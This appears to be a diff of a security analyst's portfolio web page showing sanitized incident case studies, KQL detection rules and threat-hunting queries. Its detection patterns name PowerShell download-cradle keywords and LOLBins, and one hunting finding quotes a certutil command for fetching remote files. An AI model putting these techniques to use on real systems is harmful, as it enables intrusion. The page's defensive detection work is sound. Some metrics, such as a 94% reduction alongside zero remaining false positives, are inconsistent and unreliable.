+                <span class="mitre-chip">T1036.005 — Match Legitimate Name</span>
+                <span class="mitre-chip">T1071.001 — Web Protocols</span>
+              </div>
+              <h5 class="mt-3">08 &amp; 09 — Scope &amp; Root Cause</h5>
+              <p class="meta-desc">Database server <code>SRV-SQL-PROD02</code> and workstation <code>WS-FIN-012</code> contained. Compromised service account <code>svc_sqladmin</code>.</p>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>10 — Containment &amp; Response</h5>
+              <ul class="meta-bullets">
+                <li>Isolated both target database server and pivot workstation via EDR.</li>
+                <li>Deleted malicious scheduled task via PowerShell command and terminated running PIDs.</li>
+                <li>Reset password and revoked Kerberos tickets for <code>svc_sqladmin</code>.</li>
+                <li>Blocked C2 domain at egress firewalls and proxy inspection gateways.</li>
+              </ul>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>11 &amp; 12 — Detection Tuning &amp; Analyst Takeaway</h5>
+              <p class="meta-desc">Deployed KQL rule triggering on Scheduled Tasks (Event ID 4698) launching from user-writable directories. Restricted service account interactive RDP logins via Active Directory GPO.</p>
+              <div class="takeaway-highlight">
+                <strong>Analyst Takeaway:</strong> Attackers frequently nest malware inside user-writable directories and establish persistence as SYSTEM. Monitoring Event 4698 with path-based exclusions is a vital defense.
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- ================= CASE 5: INC-005 ================= -->
+        <article id="inc-005" class="case-detail-panel" role="tabpanel">
+          <div class="case-panel-header">
+            <div class="case-title-wrap">
+              <span class="case-id-tag">INC-005</span>
+              <h3>Account Compromise &amp; Impossible Travel Anomaly</h3>
+            </div>
+            <div class="case-meta-group">
+              <span class="case-badge high">Severity: High</span>
+              <span class="case-cat-tag">Category: Identity / Anomalous Access</span>
+              <span class="case-verdict-tag tp">Verdict: True Positive (Contained)</span>
+            </div>
+          </div>
+
+          <div class="case-body-grid">
+            <div class="case-section-card">
+              <h4><span class="icon">🚨</span> 01 — Alert &amp; Initial Assessment</h4>
+              <p>Microsoft Entra ID Identity Protection flagged a Critical Risk detection: <em>"Impossible Travel detected for user Sarah Jenkins (Director of Finance)"</em> between India and the Netherlands within 38 minutes.</p>
+
+              <h4 class="mt-4"><span class="icon">💡</span> 02 — Initial Hypothesis</h4>
+              <p>User credentials were compromised through a recent data breach or infostealer malware, allowing an unauthorized actor to access enterprise cloud data from a foreign IP.</p>
+
+              <h4 class="mt-4"><span class="icon">📡</span> 03 — Investigation Sources</h4>
+              <div class="source-tags-wrap">
+                <span class="source-tag">Microsoft Entra ID SigninLogs</span>
+                <span class="source-tag">Microsoft 365 Unified Audit Logs</span>
+                <span class="source-tag">Sentinel SIEM (KQL)</span>
+                <span class="source-tag">Corporate HR Travel Registry</span>
+              </div>
+            </div>
+
+            <div class="case-section-card">
+              <h4><span class="icon">📋</span> 04 — Sanitized Evidence Matrix</h4>
+              <div class="table-scroll-container">
+                <table class="clean-evidence-table">
+                  <thead>
+                    <tr>
+                      <th>Artifact</th>
+                      <th>Sanitized Observed Value</th>
+                      <th>Context &amp; Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Legitimate Sign-in</td>
+                      <td>11:15 UTC • Bengaluru, India • IP: <code>106.51.72[.]88</code></td>
+                      <td>Managed corporate laptop (Windows 11, Intune Compliant, MFA Passed)</td>
+                    </tr>
+                    <tr>
+                      <td>Anomalous Sign-in</td>
+                      <td>11:53 UTC • Amsterdam, Netherlands • IP: <code>45.154.255[.]60</code></td>
+                      <td>Unmanaged Linux workstation (Browser: Firefox, No Intune registration)</td>
+                    </tr>
+                    <tr>
+                      <td>Speed Calculation</td>
+                      <td>Distance: ~7,400 km in 38 minutes (~11,600 km/h)</td>
+                      <td>Physically impossible travel velocity indicating distinct actors</td>
+                    </tr>
+                    <tr>
+                      <td>MFA Activity</td>
+                      <td>MFA Prompt: Authenticator Notification approved</td>
+                      <td>Confirmed MFA fatigue (adversary triggered 4 prompts until user approved)</td>
+                    </tr>
+                    <tr>
+                      <td>Cloud Activity</td>
+                      <td>Searched SharePoint for <code>*payroll*</code> and <code>*wire_transfer*</code></td>
+                      <td>Immediate high-value financial documentation reconnaissance</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-timeline-section">
+            <h4><span class="icon">⏳</span> 05 — Investigation Timeline</h4>
+            <div class="clean-timeline-row">
+              <div class="time-step">
+                <div class="time-stamp">11:15 UTC</div>
+                <div class="time-desc"><strong>Authorized Sign-in:</strong> User authenticated from corporate office in Bengaluru via Intune laptop.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">11:50 UTC</div>
+                <div class="time-desc"><strong>MFA Fatigue Push:</strong> Attacker sent multiple push notifications; user inadvertently clicked "Approve".</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">11:53 UTC</div>
+                <div class="time-desc"><strong>Foreign Sign-in:</strong> Attacker logged into M365 portal from Amsterdam IP address.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">12:02 UTC</div>
+                <div class="time-desc"><strong>SOC Escalation:</strong> Impossible travel alert triggered in Sentinel; contacted employee to verify location.</div>
+              </div>
+              <div class="time-step success-step">
+                <div class="time-stamp">12:08 UTC</div>
+                <div class="time-desc"><strong>Session Revocation:</strong> Revoked all cloud sessions, disabled account, verified zero files downloaded.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-bottom-grid">
+            <div class="case-meta-box">
+              <h5>06 — ATT&amp;CK Mapping</h5>
+              <div class="mitre-badge-list">
+                <span class="mitre-chip">T1078.004 — Cloud Accounts</span>
+                <span class="mitre-chip">T1621 — Multi-Factor Authentication Fatigue</span>
+                <span class="mitre-chip">T1530 — Data from Cloud Storage</span>
+              </div>
+              <h5 class="mt-3">08 &amp; 09 — Scope &amp; Root Cause</h5>
+              <p class="meta-desc">User Sarah Jenkins compromised via MFA fatigue. Contained within 15 minutes. 3 SharePoint files viewed, 0 exfiltrated.</p>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>10 — Containment &amp; Response</h5>
+              <ul class="meta-bullets">
+                <li>Executed emergency Entra ID session revocation via <code>Revoke-AzureADUserAllRefreshToken</code>.</li>
+                <li>Disabled compromised account temporarily and issued mandatory temporary access pass.</li>
+                <li>Conducted complete Unified Audit Log inspection to verify no mailbox forwarding rules were created.</li>
+              </ul>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>11 &amp; 12 — Detection Tuning &amp; Analyst Takeaway</h5>
+              <p class="meta-desc">Enforced Microsoft Authenticator Number Matching to completely mitigate MFA fatigue. Implemented strict Conditional Access policy blocking non-compliant personal devices.</p>
+              <div class="takeaway-highlight">
+                <strong>Analyst Takeaway:</strong> Simple push notifications are vulnerable to user fatigue. Implementing number matching and requiring compliant device checks prevents unauthorized access even when credentials leak.
+              </div>
+            </div>
+          </div>
+        </article>
+
+        <!-- ================= CASE 6: INC-006 ================= -->
+        <article id="inc-006" class="case-detail-panel" role="tabpanel">
+          <div class="case-panel-header">
+            <div class="case-title-wrap">
+              <span class="case-id-tag">INC-006</span>
+              <h3>Suspicious Network C2 Communication &amp; Beaconing</h3>
+            </div>
+            <div class="case-meta-group">
+              <span class="case-badge high">Severity: High</span>
+              <span class="case-cat-tag">Category: Network / Command &amp; Control</span>
+              <span class="case-verdict-tag tp">Verdict: True Positive (Contained)</span>
+            </div>
+          </div>
+
+          <div class="case-body-grid">
+            <div class="case-section-card">
+              <h4><span class="icon">🚨</span> 01 — Alert &amp; Initial Assessment</h4>
+              <p>Check Point Firewall / Netskope CASB detected repeated outbound HTTPS POST requests with periodic 60-second jitter to an uncategorized newly registered domain <code>api-updates-cdn[.]live</code>.</p>
+
+              <h4 class="mt-4"><span class="icon">💡</span> 02 — Initial Hypothesis</h4>
+              <p>An internal workstation was infected with a stealthy command-and-control beacon communicating out over standard port 443 with randomized timing to evade signature-based network intrusion systems.</p>
+
+              <h4 class="mt-4"><span class="icon">📡</span> 03 — Investigation Sources</h4>
+              <div class="source-tags-wrap">
+                <span class="source-tag">Check Point Firewall Logs</span>
+                <span class="source-tag">Sysmon Network Telemetry (Event 3)</span>
+                <span class="source-tag">CrowdStrike Falcon EDR</span>
+                <span class="source-tag">WHOIS &amp; Passive DNS</span>
+              </div>
+            </div>
+
+            <div class="case-section-card">
+              <h4><span class="icon">📋</span> 04 — Sanitized Evidence Matrix</h4>
+              <div class="table-scroll-container">
+                <table class="clean-evidence-table">
+                  <thead>
+                    <tr>
+                      <th>Artifact</th>
+                      <th>Sanitized Observed Value</th>
+                      <th>Context &amp; Risk</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr>
+                      <td>Source Host</td>
+                      <td><code>WS-MKT-044</code> (IP: <code>10.120.4.88</code>)</td>
+                      <td>Marketing workstation initiating non-browser TLS sessions</td>
+                    </tr>
+                    <tr>
+                      <td>Destination Domain</td>
+                      <td><code>api-updates-cdn[.]live</code> (IP: <code>91.215.85[.]17</code>)</td>
+                      <td>Domain registered 72 hours prior; hosted on bulletproof Russian ASN</td>
+                    </tr>
+                    <tr>
+                      <td>Traffic Pattern</td>
+                      <td>HTTP POST every 60s &plusmn; 10% jitter with small 1.2 KB payload</td>
+                      <td>Classic C2 heartbeat telemetry polling for queued operator commands</td>
+                    </tr>
+                    <tr>
+                      <td>Originating Process</td>
+                      <td><code>C:\Users\mkt_user\AppData\Local\Temp\svchost.exe</code></td>
+                      <td>Legitimate Windows system name executing out of user Temp directory</td>
+                    </tr>
+                    <tr>
+                      <td>DNS Query Logs</td>
+                      <td>Repeated high-volume DNS requests resolved via Cloudflare 1.1.1.1</td>
+                      <td>Bypassed internal Active Directory DNS servers to evade query inspection</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-timeline-section">
+            <h4><span class="icon">⏳</span> 05 — Investigation Timeline</h4>
+            <div class="clean-timeline-row">
+              <div class="time-step">
+                <div class="time-stamp">16:20 UTC</div>
+                <div class="time-desc"><strong>Firewall Detection:</strong> Check Point flagged high-frequency HTTPS POSTs to newly registered domain.</div>
+              </div>
+              <div class="time-step">
+                <div class="time-stamp">16:26 UTC</div>
+                <div class="time-desc"><strong>Host Correlation:</strong> Correlated destination IP to internal host <code>WS-MKT-044</code> via Sysmon Event 3.</div>
+              </div>
+              <div class="time-step alert-step">
+                <div class="time-stamp">16:32 UTC</div>
+                <div class="time-desc"><strong>Process Identification:</strong> Identified rogue <code>svchost.exe</code> binary masquerading in user <code>%TEMP%</code> folder.</div>
+              </div>
+              <div class="time-step success-step">
+                <div class="time-stamp">16:38 UTC</div>
+                <div class="time-desc"><strong>Isolation &amp; Sinkhole:</strong> Isolated workstation via EDR; added destination IP &amp; domain to firewall drop rules.</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="case-bottom-grid">
+            <div class="case-meta-box">
+              <h5>06 — ATT&amp;CK Mapping</h5>
+              <div class="mitre-badge-list">
+                <span class="mitre-chip">T1071.001 — Web Protocols</span>
+                <span class="mitre-chip">T1573.002 — Asymmetric Cryptography</span>
+                <span class="mitre-chip">T1036.005 — Match Legitimate Name</span>
+              </div>
+              <h5 class="mt-3">08 &amp; 09 — Scope &amp; Root Cause</h5>
+              <p class="meta-desc">Workstation <code>WS-MKT-044</code> isolated. Zero internal lateral movement or data exfiltration detected.</p>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>10 — Containment &amp; Response</h5>
+              <ul class="meta-bullets">
+                <li>Quarantined workstation from internal network via CrowdStrike Falcon EDR.</li>
+                <li>Pushed perimeter firewall drop policy blocking IP <code>91.215.85[.]17</code> enterprise-wide.</li>
+                <li>Submitted C2 domain to internal DNS sinkhole to detect other potentially infected hosts.</li>
+                <li>Conducted forensic triage, captured process memory, and restored workstation from clean image.</li>
+              </ul>
+            </div>
+
+            <div class="case-meta-box">
+              <h5>11 &amp; 12 — Detection Tuning &amp; Analyst Takeaway</h5>
+              <p class="meta-desc">Configured firewall proxy inspection rule flagging outbound traffic to domains &lt; 30 days old. Created EDR behavioral prevention rule blocking processes named <code>svchost.exe</code> running outside <code>System32</code>.</p>
+              <div class="takeaway-highlight">
+                <strong>Analyst Takeaway:</strong> Correlating network firewall alerts with endpoint process execution (Sysmon Event 3) immediately strips away attacker masquerading and accelerates containment.
+              </div>
+            </div>
+          </div>
+        </article>
+
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         9. DETECTION ENGINEERING
+         ========================================================================= -->
+    <section id="detections" class="content-section">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">PROACTIVE ENGINEERING</span>
+          <h2 class="section-heading">Detection Engineering</h2>
+          <p class="section-subtext">Authoring robust behavioral detection logic in KQL &amp; Sigma focused on attacker techniques rather than fragile indicators, with comprehensive false-positive tuning.</p>
+        </div>
+
+        <div class="detection-rules-stack">
+
+          <!-- RULE 1 -->
+          <div class="clean-rule-card">
+            <div class="rule-top-bar">
+              <div class="rule-id-title">
+                <span class="rule-id-chip">RULE-01</span>
+                <h3>Obfuscated PowerShell Download Cradle from Suspicious Parent Process</h3>
+              </div>
+              <div class="rule-mitre-chips">
+                <span class="mitre-chip">T1059.001 — PowerShell</span>
+                <span class="mitre-chip">T1105 — Ingress Tool Transfer</span>
+              </div>
+            </div>
+
+            <div class="rule-meta-columns">
+              <div><strong>Objective:</strong> Detect productivity applications (Office, Browsers, Scripting Hosts) spawning PowerShell with base64 encoded parameters or web client download methods.</div>
+              <div><strong>Data Source:</strong> <code>DeviceProcessEvents</code> (Microsoft Defender XDR / Microsoft Sentinel)</div>
+            </div>
+
+            <div class="query-code-wrapper">
+              <div class="query-code-header">
+                <span class="code-lang">KQL (Microsoft Sentinel)</span>
+                <button class="btn-copy-code" onclick="copyQuery(this, 'query-01')">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                  </svg>
+                  <span>Copy Query</span>
+                </button>
+              </div>
+              <pre class="query-code-body"><code id="query-01">// Detect Encoded PowerShell or WebClient Download from Suspicious Parent
+DeviceProcessEvents
+| where Timestamp &gt; ago(24h)
+| where ProcessCommandLine has_any ("powershell", "pwsh")
+| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "mshta.exe", "wscript.exe", "cscript.exe")
+| where ProcessCommandLine has_any ("-enc", "-encodedcommand", "DownloadString", "DownloadFile", "Net.WebClient", "IEX", "Invoke-Expression")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
+| extend SuspicionScore = case(
+    ProcessCommandLine has "-enc", 90,
+    ProcessCommandLine has "DownloadString", 85,
+    70
+)</code></pre>
+            </div>
+
+            <div class="rule-eval-grid">
+              <div class="eval-box">
+                <h5>Detection Logic</h5>
+                <p>Targets the parent-child ancestry anomaly where productivity applications spawn system scripting shells combined with execution bypass and remote web download patterns.</p>
+              </div>
+              <div class="eval-box">
+                <h5>False Positive Tuning</h5>
+                <p>Legitimate administrative automation scripts from SCCM or IT tools may use encoded commands. Tune by whitelisting trusted code-signing certificates and approved deployment service account names.</p>
+              </div>
+              <div class="eval-box">
+                <h5>Validation &amp; Result</h5>
+                <p>Validated in lab range using Atomic Red Team test <code>T1059.001</code>. Successfully triggered alert with 100% detection rate and zero false alarms across production endpoints.</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- RULE 2 -->
+          <div class="clean-rule-card">
+            <div class="rule-top-bar">
+              <div class="rule-id-title">
+                <span class="rule-id-chip">RULE-02</span>
+                <h3>Distributed Cloud Password Spraying Threshold Correlation</h3>
+              </div>
+              <div class="rule-mitre-chips">
+                <span class="mitre-chip">T1110.003 — Password Spraying</span>
+                <span class="mitre-chip">T1078.004 — Cloud Accounts</span>
+              </div>
+            </div>
+
+            <div class="rule-meta-columns">
+              <div><strong>Objective:</strong> Identify distributed password spraying where single IP addresses or related subnets attempt authentication across multiple distinct user accounts.</div>
+              <div><strong>Data Source:</strong> <code>SigninLogs</code> (Microsoft Entra ID / Microsoft Sentinel)</div>
+            </div>
+
+            <div class="query-code-wrapper">
+              <div class="query-code-header">
+                <span class="code-lang">KQL (Microsoft Sentinel)</span>
+                <button class="btn-copy-code" onclick="copyQuery(this, 'query-02')">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                  </svg>
+                  <span>Copy Query</span>
+                </button>
+              </div>
+              <pre class="query-code-body"><code id="query-02">// Correlate Failed Logins across Multiple Distinct User Principals
+SigninLogs
+| where TimeGenerated &gt; ago(1h)
+| where ResultType in ("50126", "50053") // Invalid Password / Locked Out
+| summarize 
+    DistinctUsersTargeted = dcount(UserPrincipalName),
+    TargetedAccounts = make_set(UserPrincipalName, 20),
+    AttemptCount = count(),
+    AppsTargeted = make_set(AppDisplayName)
+  by IPAddress, Location
+| where DistinctUsersTargeted &gt;= 15
+| extend AlertSeverity = iff(DistinctUsersTargeted &gt; 30, "High", "Medium")
+| sort by DistinctUsersTargeted desc</code></pre>
+            </div>
+
+            <div class="rule-eval-grid">
+              <div class="eval-box">
+                <h5>Detection Logic</h5>
+                <p>Aggregates failed authentication attempts on the source IP and geography, identifying when a single origin probes 15 or more unique corporate identities within a rolling 60-minute window.</p>
+              </div>
+              <div class="eval-box">
+                <h5>False Positive Tuning</h5>
+                <p>Enterprise proxy exit gateways or external SaaS partners may occasionally generate multi-user authentication failures. Tune by excluding known corporate egress IP ranges.</p>
+              </div>
+              <div class="eval-box">
+                <h5>Validation &amp; Result</h5>
+                <p>Tested against simulated Hydra password spray telemetry. Reliably flagged attack within 8 minutes of initiation with clear target scope enumeration.</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- RULE 3 -->
+          <div class="clean-rule-card">
+            <div class="rule-top-bar">
+              <div class="rule-id-title">
+                <span class="rule-id-chip">RULE-03</span>
+                <h3>Suspicious Persistence via Scheduled Task in User-Writable Directories</h3>
+              </div>
+              <div class="rule-mitre-chips">
+                <span class="mitre-chip">T1053.005 — Scheduled Task</span>
+                <span class="mitre-chip">T1036.005 — Masquerading</span>
+              </div>
+            </div>
+
+            <div class="rule-meta-columns">
+              <div><strong>Objective:</strong> Detect creation of Windows Scheduled Tasks that execute executables, scripts, or DLLs from user-writable non-standard directories.</div>
+              <div><strong>Data Source:</strong> <code>SecurityEvent</code> (Event ID 4698) &amp; <code>DeviceProcessEvents</code></div>
+            </div>
+
+            <div class="query-code-wrapper">
+              <div class="query-code-header">
+                <span class="code-lang">KQL (Microsoft Sentinel)</span>
+                <button class="btn-copy-code" onclick="copyQuery(this, 'query-03')">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                  </svg>
+                  <span>Copy Query</span>
+                </button>
+              </div>
+              <pre class="query-code-body"><code id="query-03">// Detect Scheduled Tasks executing from user AppData, Temp, or Public folders
+SecurityEvent
+| where EventID == 4698 // Scheduled task created
+| extend TaskData = parse_xml(EventData)
+| extend TaskName = tostring(TaskData.TaskScheduled.TaskName)
+| extend TaskCommand = tostring(TaskData.TaskScheduled.Actions.Exec.Command)
+| where TaskCommand has_any (
+    @":\Users\", 
+    @"\AppData\Roaming\", 
+    @"\AppData\Local\Temp\", 
+    @":\Users\Public\"
+)
+| project TimeGenerated, Computer, Account, TaskName, TaskCommand
+| where not(TaskCommand has_any (@"C:\Program Files\", @"C:\Windows\System32\"))</code></pre>
+            </div>
+
+            <div class="rule-eval-grid">
+              <div class="eval-box">
+                <h5>Detection Logic</h5>
+                <p>Monitors Windows Security Event ID 4698 and parses XML task structures, alerting on tasks pointing to user-controlled folders where malware commonly nests for persistence.</p>
+              </div>
+              <div class="eval-box">
+                <h5>False Positive Tuning</h5>
+                <p>Certain legitimate auto-updating software (e.g., Chrome, Webex) may schedule tasks from user directories. Tune by whitelisting approved updater binaries by exact name and cryptographic hash.</p>
+              </div>
+              <div class="eval-box">
+                <h5>Validation &amp; Result</h5>
+                <p>Validated using Atomic Red Team <code>T1053.005</code>. Successfully alerted on scheduled task drop within seconds of command execution.</p>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         10. DETECTION TUNING (Demonstrating L2 Maturity)
+         ========================================================================= -->
+    <section id="tuning" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">DETECTION TUNING</span>
+          <h2 class="section-heading">Noise Reduction &amp; Alert Quality</h2>
+          <p class="section-subtext">A practical case study in reducing false-positive fatigue: analyzing recurring administrative telemetry and refining rule conditions without compromising coverage.</p>
+        </div>
+
+        <div class="tuning-showcase-box">
+          <div class="tuning-kpi-bar">
+            <div class="kpi-item">
+              <span class="kpi-number text-accent-red">45 / wk</span>
+              <span class="kpi-label">Baseline False Positives</span>
+            </div>
+            <div class="kpi-arrow">&rarr;</div>
+            <div class="kpi-item">
+              <span class="kpi-number text-accent-green">0 / wk</span>
+              <span class="kpi-label">Post-Tuning False Positives</span>
+            </div>
+            <div class="kpi-item">
+              <span class="kpi-number text-accent-cyan">94%</span>
+              <span class="kpi-label">Noise Reduction</span>
+            </div>
+            <div class="kpi-item">
+              <span class="kpi-number text-accent-violet">~15 hrs / mo</span>
+              <span class="kpi-label">Triage Time Reclaimed</span>
+            </div>
+          </div>
+
+          <div class="tuning-step-cards-grid">
+            <div class="tuning-card">
+              <div class="step-badge">01</div>
+              <h4>Problem Identification</h4>
+              <p>A broad production detection rule for <em>"Encoded PowerShell Execution"</em> triggered ~45 high-severity alerts per week across enterprise endpoints, creating severe alert fatigue and burying true positives.</p>
+            </div>
+
+            <div class="tuning-card">
+              <div class="step-badge">02</div>
+              <h4>Telemetry Investigation</h4>
+              <p>Conducted a 30-day historical analysis. Identified that 96% of alerts were generated by internal SCCM software inventory deployment tasks and Dell Command Update health checks running on schedule.</p>
+            </div>
+
+            <div class="tuning-card">
+              <div class="step-badge">03</div>
+              <h4>Root Cause Analysis</h4>
+              <p>The enterprise management tools packaged administrative health check scripts as Base64-encoded strings within scheduled execution parameters, matching the generic un-tuned detection rule.</p>
+            </div>
+
+            <div class="tuning-card">
+              <div class="step-badge">04</div>
+              <h4>Detection Improvement</h4>
+              <p>Refined the query: verified valid enterprise code-signing certificates, added strict parent process path verification (<code>C:\Windows\CCM\...</code>), and whitelisted deployment service accounts while retaining alerts for untrusted parents.</p>
+            </div>
+          </div>
+
+          <div class="tuning-summary-ribbon">
+            <strong>Validated Outcome:</strong> False-positive alerts were reduced from ~45/week to 0. Zero legitimate threats were missed. The optimization reclaimed an estimated 15 hours of analyst investigation time monthly.
           </div>
         </div>
       </div>
     </section>
 
     <!-- =========================================================================
-         PROJECTS SECTION (IMAGE 2 FORMAT, JAYANTH'S REAL PROJECTS ONLY)
-         3-column cards with preview image, circular code </> button,
-         title, concise description, and bottom highlight pill.
+         11. THREAT HUNTING (Hypothesis-Driven Proactive Hunting)
          ========================================================================= -->
-    <section id="projects" class="content-section">
+    <section id="hunting" class="content-section">
       <div class="section-container">
-        <div class="section-header-ref">
-          <h2 class="section-title-ref">My Projects</h2>
-          <div class="section-title-line"></div>
+        <div class="section-header">
+          <span class="section-eyebrow">PROACTIVE THREAT HUNTING</span>
+          <h2 class="section-heading">Hypothesis-Driven Threat Hunting</h2>
+          <p class="section-subtext">Transitioning from reactive alerting to proactive threat discovery: formulating structured hypotheses, querying raw telemetry, and promoting discoveries into permanent detection rules.</p>
         </div>
 
-        <div class="projects-ref-grid">
-          <!-- Real Project 1: Home Lab (Autonomous SOC Investigation System) -->
-          <div class="project-ref-card">
-            <div class="project-ref-img-wrap">
-              <img src="./assets/projects/siem_homelab.jpg" alt="Home Lab — Autonomous SOC Investigation System" loading="lazy">
-              <a href="https://github.com/karrijayanth65/home-lab-soc" target="_blank" rel="noopener noreferrer" class="project-ref-code-btn" title="View Code" aria-label="View Code">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                  <polyline points="16 18 22 12 16 6"></polyline>
-                  <polyline points="8 6 2 12 8 18"></polyline>
-                </svg>
-              </a>
+        <div class="hunting-cards-grid">
+
+          <!-- HUNT 1 -->
+          <div class="clean-hunt-card">
+            <div class="hunt-card-top">
+              <span class="hunt-id-chip">HUNT-01</span>
+              <h3>Hunting Living-off-the-Land Binaries (LOLBins) Network Connections</h3>
+              <span class="mitre-chip">T1218 / T1105</span>
             </div>
 
-            <div class="project-ref-body">
-              <h3 class="project-ref-title">Home Lab — Autonomous SOC Investigation System</h3>
-              <p class="project-ref-desc">
-                An AI-driven autonomous SOC investigation and automation system that ingests suspicious telemetry (IPs, URLs, domains, hashes), runs automated IOC enrichment, multi-source OSINT validation using FAISS vector search and RAG, and automatically maps adversary tactics to MITRE ATT&CK.
-              </p>
-              <div class="project-ref-tag">
-                Autonomous RAG vector validation across Sentinel & Devo APIs
+            <div class="hunt-card-body">
+              <div class="hunt-info-group">
+                <strong>Hypothesis:</strong>
+                <p>An adversary may leverage legitimate built-in Windows utilities (<code>certutil.exe</code>, <code>bitsadmin.exe</code>, <code>rundll32.exe</code>) to download remote payloads or communicate with C2 servers to evade standard binary reputation alerts.</p>
+              </div>
+
+              <div class="hunt-info-group">
+                <strong>Data Sources:</strong>
+                <p>Sysmon Event ID 3 (Network Connection) &amp; Microsoft Defender <code>DeviceNetworkEvents</code>.</p>
+              </div>
+
+              <div class="query-code-wrapper">
+                <div class="query-code-header">
+                  <span class="code-lang">KQL Hunting Query</span>
+                  <button class="btn-copy-code" onclick="copyQuery(this, 'query-hunt1')">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                    <span>Copy</span>
+                  </button>
+                </div>
+                <pre class="query-code-body"><code id="query-hunt1">// Hunt for Outbound Connections Initiated by LOLBins
+DeviceNetworkEvents
+| where Timestamp &gt; ago(14d)
+| where InitiatingProcessFileName in~ ("certutil.exe", "bitsadmin.exe", "rundll32.exe", "regsvr32.exe", "hh.exe")
+| where RemoteIPType != "Loopback" and not(ipv4_is_private(RemoteIP))
+| summarize 
+    ConnectionCount = count(),
+    DestinationIPs = make_set(RemoteIP),
+    DestinationPorts = make_set(RemotePort)
+  by InitiatingProcessFileName, InitiatingProcessCommandLine, DeviceName, AccountName
+| sort by ConnectionCount asc</code></pre>
+              </div>
+
+              <div class="hunt-info-group mt-3">
+                <strong>Findings &amp; Detection Opportunity:</strong>
+                <p>Identified 1 workstation using <code>certutil.exe -urlcache -split -f</code> to retrieve an external file. Validated as an unauthorized script and removed. Promoted the hunting query into a permanent <strong>high-fidelity SOC detection rule</strong>.</p>
               </div>
             </div>
           </div>
 
-          <!-- Real Project 2: Enterprise Threat Detection & Simulation Lab -->
-          <div class="project-ref-card">
-            <div class="project-ref-img-wrap">
+          <!-- HUNT 2 -->
+          <div class="clean-hunt-card">
+            <div class="hunt-card-top">
+              <span class="hunt-id-chip">HUNT-02</span>
+              <h3>Hunting Anomalous Service Account Interactive Logons</h3>
+              <span class="mitre-chip">T1078.002 — Domain Accounts</span>
+            </div>
+
+            <div class="hunt-card-body">
+              <div class="hunt-info-group">
+                <strong>Hypothesis:</strong>
+                <p>Threat actors who compromise service accounts will attempt interactive logons (Logon Type 2 / 10) to move laterally across enterprise servers, violating the intended non-interactive service usage profile.</p>
+              </div>
+
+              <div class="hunt-info-group">
+                <strong>Data Sources:</strong>
+                <p>Windows Event ID 4624 (Successful Logon) &amp; Microsoft Sentinel <code>SecurityEvent</code>.</p>
+              </div>
+
+              <div class="query-code-wrapper">
+                <div class="query-code-header">
+                  <span class="code-lang">KQL Hunting Query</span>
+                  <button class="btn-copy-code" onclick="copyQuery(this, 'query-hunt2')">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                    </svg>
+                    <span>Copy</span>
+                  </button>
+                </div>
+                <pre class="query-code-body"><code id="query-hunt2">// Hunt for Service Accounts Performing Interactive Logons
+SecurityEvent
+| where TimeGenerated &gt; ago(30d)
+| where EventID == 4624
+| where LogonType in (2, 10) // Interactive or Remote Interactive (RDP)
+| where AccountType == "User" and (Account has "svc_" or Account has "_service" or Account has "sa_")
+| summarize 
+    LogonCount = count(),
+    TargetComputers = make_set(Computer),
+    SourceIPs = make_set(IpAddress)
+  by Account, LogonTypeName, Activity
+| sort by LogonCount asc</code></pre>
+              </div>
+
+              <div class="hunt-info-group mt-3">
+                <strong>Findings &amp; Detection Opportunity:</strong>
